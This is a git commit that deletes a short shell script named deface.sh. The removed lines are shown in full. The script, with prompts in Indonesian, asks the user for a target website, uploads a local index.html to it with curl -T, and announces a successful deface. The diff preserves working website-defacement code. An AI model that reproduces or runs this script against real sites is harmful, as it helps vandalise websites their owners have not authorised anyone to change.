e55a29950e06b4347ffeae4529fcfae996e8b29b
Arie-SR91 <73356328+Arie-SR91@users.noreply.github.com>
2020-11-15 07:34:28 +0000

    Delete deface.sh

--- deface.sh
+++
@@ -1,8 +0,0 @@
-#defacer
-
-echo  "| Masukkan situs yang ingin di Deface!!!                              |"
-echo  "| ╭─""[ user91 ]"" ~/RedCyberAmt                                          |"
-read -p "| ╰─$ "  target
-curl -T/storage/emulated/0/index.html $target
-echo  "|"
-echo  "|          [""Hacked""]"" Success Deface to"" $target"
